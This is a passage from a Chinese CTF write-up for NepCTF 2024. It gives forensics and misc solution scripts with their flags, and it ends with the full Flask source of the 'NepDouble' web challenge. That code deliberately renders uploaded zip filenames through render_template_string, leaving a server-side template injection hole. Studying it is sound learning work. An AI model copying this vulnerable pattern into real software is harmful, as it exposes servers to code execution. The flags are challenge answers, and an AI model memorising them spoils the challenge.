+</span></span></code></pre></div><p>exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#75715e># 补全</span>
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 将字符串转换为列表</span>
+</span></span><span style=display:flex><span>flag_list <span style=color:#f92672>=</span> list(flag)
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> chr(<span style=color:#ae81ff>83</span>)<span style=color:#f92672>.</span>lower()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#f92672>-</span><span style=color:#ae81ff>3</span>:] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ve}&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># base64解密带入</span>
+</span></span><span style=display:flex><span>base64_code <span style=color:#f92672>=</span> list(base64<span style=color:#f92672>.</span>b64decode(<span style=color:#e6db74>&#34;RnJpSGlt&#34;</span>)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>13</span>] <span style=color:#f92672>=</span> base64_code[<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>28</span>:<span style=color:#ae81ff>31</span>] <span style=color:#f92672>=</span> base64_code[<span style=color:#ae81ff>3</span>:]
+</span></span><span style=display:flex><span><span style=color:#75715e># 简单数学计算答案15</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>24</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>25</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;5&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 计算带入</span>
+</span></span><span style=display:flex><span>number <span style=color:#f92672>=</span> str(int(<span style=color:#ae81ff>1028970</span><span style=color:#f92672>/</span><span style=color:#ae81ff>927</span>))
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>33</span>] <span style=color:#f92672>=</span> number[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>41</span>] <span style=color:#f92672>=</span> number[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>43</span>:<span style=color:#ae81ff>45</span>] <span style=color:#f92672>=</span> number[<span style=color:#ae81ff>2</span>:]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>str1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1t1rna&#34;</span><span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;1&#34;</span>, <span style=color:#e6db74>&#34;e&#34;</span>)
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>35</span>:<span style=color:#ae81ff>41</span>] <span style=color:#f92672>=</span> str1
+</span></span><span style=display:flex><span><span style=color:#75715e># 转化大小写</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>31</span>:<span style=color:#ae81ff>33</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;me&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 进行分割</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;_&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>19</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;_&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>34</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;_&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>42</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;_&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>17</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&amp;&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>27</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&amp;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> chr(<span style=color:#ae81ff>69</span>)<span style=color:#f92672>.</span>lower()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cet4&#34;</span>[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>4</span>:<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cet4&#34;</span>[<span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>7</span>] <span style=color:#f92672>=</span> chr(ord(<span style=color:#e6db74>&#39;j&#39;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>8</span>] <span style=color:#f92672>=</span> chr(ord(<span style=color:#e6db74>&#39;t&#39;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>=</span> chr(ord(<span style=color:#e6db74>&#39;|&#39;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>18</span>] <span style=color:#f92672>=</span> chr(ord(<span style=color:#e6db74>&#39;D&#39;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>26</span>] <span style=color:#f92672>=</span> chr(ord(<span style=color:#e6db74>&#39;f&#39;</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># 前面的是芙莉莲后面的是辛美尔</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>17</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;eren&#34;</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>20</span>:<span style=color:#ae81ff>24</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SunR&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 猜测是单词secret</span>
+</span></span><span style=display:flex><span>flag_list[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;r&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(flag_list)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(flag)
+</span></span></code></pre></div><p>得到**secret_is{Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve}**解压得到图片，010分析之后可能需要异或得到原来的图片(第一次见,涨知识了)</p><p>exp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>enc <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;miaomiao.png&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;secret_is{Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve}&#39;</span>
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(enc)):
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> enc[i]<span style=color:#f92672>^</span>key[i<span style=color:#f92672>%</span>len(key)]
+</span></span><span style=display:flex><span>    flag<span style=color:#f92672>.</span>append(data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> bytes(flag)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>open(<span style=color:#e6db74>&#39;flag.png&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>)<span style=color:#f92672>.</span>write(flag)
+</span></span></code></pre></div><p>没有直接的flag，crc爆破一下得到flag</p><p><img alt=flag loading=lazy src=/posts/ctf/nepctf2024/flag.png></p><h2 id=nepmagic--checkin>NepMagic —— CheckIn</h2><p>游戏签到，有一层需要盲走得到隐藏的碎片，走完就可以得到flag了</p><p><img alt=checkin loading=lazy src=/posts/ctf/nepctf2024/checkin.png></p><h2 id=3dnep>3DNep</h2><p>也是第一次见，010打开开头是gitf，搜索一下是3d模型的图片，改一下.gitf，用该网站看一下<a href=https://gltf-viewer.donmccurdy.com/>在线网址</a></p><img src=hanxin.png alt=hanxin style=zoom:67%><p>可以得到图片，遇到的二维码是汉信码也是第一次见，用在线网站扫一下，得到flag</p><p>NepCTF{6e766b59-23d1-395c26d708a4}</p><h2 id=nepcamera>NepCamera</h2><p>跟着官方wp也是学一遍，也是第一次见usb类型的流量包，根据官p和晨曦师傅的wp研究了一下，先看一下usb里面的流量包里面会发现有<code>ffd8ffe0</code>的内容，利用tshark先把内容提取出来</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tshark -r NepCamera.pcapng -T fields -e usb.iso.data &gt; test
+</span></span></code></pre></div><p>然后就是写脚本提取内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>datas <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;../test&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>hex_data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> datas:
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> i<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    hex_data <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join([d[<span style=color:#ae81ff>24</span>:] <span style=color:#66d9ef>for</span> d <span style=color:#f92672>in</span> data])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(len(hex_data))
+</span></span><span style=display:flex><span>cnt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>    start <span style=color:#f92672>=</span> hex_data<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;ffd8ffe0&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> start <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>    end <span style=color:#f92672>=</span> hex_data[start<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>:]<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;ffd8ffe0&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> end <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>:
+</span></span><span style=display:flex><span>        end <span style=color:#f92672>=</span> len(hex_data)
+</span></span><span style=display:flex><span>    out_data <span style=color:#f92672>=</span> hex_data[start:end]
+</span></span><span style=display:flex><span>    hex_data <span style=color:#f92672>=</span> hex_data[end:]
+</span></span><span style=display:flex><span>    out_data <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(out_data)
+</span></span><span style=display:flex><span>    open(<span style=color:#e6db74>&#39;./img/&#39;</span><span style=color:#f92672>+</span>str(cnt)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;.png&#39;</span>,<span style=color:#e6db74>&#39;wb&#39;</span>)<span style=color:#f92672>.</span>write(out_data)
+</span></span><span style=display:flex><span>    cnt <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(cnt)
+</span></span></code></pre></div><p>对图片进行分析一会就可以得到flag了</p><h1 id=hardware>Hardware</h1><p>进行binwalk一下得到许多文件</p><p>再进行string 分析通过排除可以得到在string 19047F里面有</p><p>猜一手base64然后就可以搜<code>=</code>有一串长的内容，利用cyber厨子得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>JZSXAQ2UIZ5VSMDVL5DTA5C7JMZTG3S7GFXFGMLHNB2F6MLOL53FQ5ZQOJFXGIJBEFPUYM3UE5ZV6RZQL5DHK4TUNAZXE7I=
+</span></span></code></pre></div><p><strong>NepCTF{Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t&rsquo;s_G0_Furth3r}</strong></p><h1 id=web>Web</h1><h2 id=nepdouble>NepDouble</h2><p>这题其实已经有思路了，就是利用上传文件进行ssti，但是自己代码没有好好看</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, render_template, render_template_string
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> zipfile <span style=color:#f92672>import</span> ZipFile
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> datetime
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> jinja2 <span style=color:#f92672>import</span> Environment, FileSystemLoader
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__, template_folder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;static&#39;</span>)
+</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;MAX_CONTENT_LENGTH&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>UPLOAD_FOLDER <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/app/uploads&#39;</span>
+</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>] <span style=color:#f92672>=</span> UPLOAD_FOLDER
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(UPLOAD_FOLDER):
+</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>makedirs(UPLOAD_FOLDER)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>template_env <span style=color:#f92672>=</span> Environment(loader<span style=color:#f92672>=</span>FileSystemLoader(<span style=color:#e6db74>&#39;static&#39;</span>), autoescape<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>render_template</span>(template_name, <span style=color:#f92672>**</span>context):
+</span></span><span style=display:flex><span>    template <span style=color:#f92672>=</span> template_env<span style=color:#f92672>.</span>get_template(template_name)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> template<span style=color:#f92672>.</span>render(<span style=color:#f92672>**</span>context)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>render_template_string</span>(template_string, <span style=color:#f92672>**</span>context):
+</span></span><span style=display:flex><span>    template <span style=color:#f92672>=</span> template_env<span style=color:#f92672>.</span>from_string(template_string)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> template<span style=color:#f92672>.</span>render(<span style=color:#f92672>**</span>context)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Please use POST method to upload files.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        clear_uploads_folder()
+</span></span><span style=display:flex><span>        files <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>files<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;tp_file&#39;</span>, <span style=color:#66d9ef>None</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> files:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;No file uploaded.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        file_size <span style=color:#f92672>=</span> len(files<span style=color:#f92672>.</span>read())
+</span></span><span style=display:flex><span>        files<span style=color:#f92672>.</span>seek(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        file_extension <span style=color:#f92672>=</span> files<span style=color:#f92672>.</span>filename<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#39;.&#39;</span>, <span style=color:#ae81ff>1</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>lower()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> file_extension <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;zip&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Invalid file type. Please upload a .zip file.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        timestamp <span style=color:#f92672>=</span> datetime<span style=color:#f92672>.</span>datetime<span style=color:#f92672>.</span>now()<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#39;%Y%m</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>%H%M%S&#39;</span>)
+</span></span><span style=display:flex><span>        md5_dir_name <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(timestamp<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
+</span></span><span style=display:flex><span>        unzip_folder <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>], md5_dir_name)
+</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>makedirs(unzip_folder, exist_ok<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> ZipFile(files) <span style=color:#66d9ef>as</span> zip_file:
+</span></span><span style=display:flex><span>            zip_file<span style=color:#f92672>.</span>extractall(path<span style=color:#f92672>=</span>unzip_folder)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        files_list <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> root, dirs, files <span style=color:#f92672>in</span> os<span style=color:#f92672>.</span>walk(unzip_folder):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> files:
+</span></span><span style=display:flex><span>                print(file)
+</span></span><span style=display:flex><span>                file_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(root, file)
+</span></span><span style=display:flex><span>                relative_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>relpath(file_path, app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>])
+</span></span><span style=display:flex><span>                link <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&lt;a href=&#34;/cat?file=</span><span style=color:#e6db74>{</span>relative_path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;&gt;</span><span style=color:#e6db74>{</span>file<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/a&gt;&#39;</span>
+</span></span><span style=display:flex><span>                files_list<span style=color:#f92672>.</span>append(link)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template_string(<span style=color:#e6db74>&#39;&lt;br&gt;&#39;</span><span style=color:#f92672>.</span>join(files_list))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Invalid filename.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;An error occurred. Please check your file and try again.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/cat&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>cat</span>():
+</span></span><span style=display:flex><span>    file_path <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;file&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> file_path:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;File path is missing.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    new_file <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>], file_path)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>commonprefix(
+</span></span><span style=display:flex><span>            [os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>abspath(new_file), os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>abspath(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>])]) <span style=color:#f92672>!=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>abspath(
+</span></span><span style=display:flex><span>            app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>]):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Invalid file path.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>islink(new_file):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Symbolic links are not allowed.&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        filename <span style=color:#f92672>=</span> file_path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;/&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>        content <span style=color:#f92672>=</span> read_large_file(new_file)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;test.html&#39;</span>, content<span style=color:#f92672>=</span>content, filename<span style=color:#f92672>=</span>filename, dates<span style=color:#f92672>=</span>Exec_date())
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>FileNotFoundError</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;File not found.&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>IOError</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Error reading file: </span><span style=color:#e6db74>{</span>str(e)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Exec_date</span>():
+</span></span><span style=display:flex><span>    d_res <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;date&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> d_res<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; &#34;</span> <span style=color:#f92672>+</span> d_res<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>clear_uploads_folder</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> root, dirs, files <span style=color:#f92672>in</span> os<span style=color:#f92672>.</span>walk(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>], topdown<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> files:
+</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>remove(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(root, file))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> dir <span style=color:#f92672>in</span> dirs:
+</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>rmdir(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(root, dir))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_large_file</span>(file_path):
+</span></span><span style=display:flex><span>    content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(file_path, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> file:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> file:
+</span></span><span style=display:flex><span>            content <span style=color:#f92672>+=</span> line
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> content
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
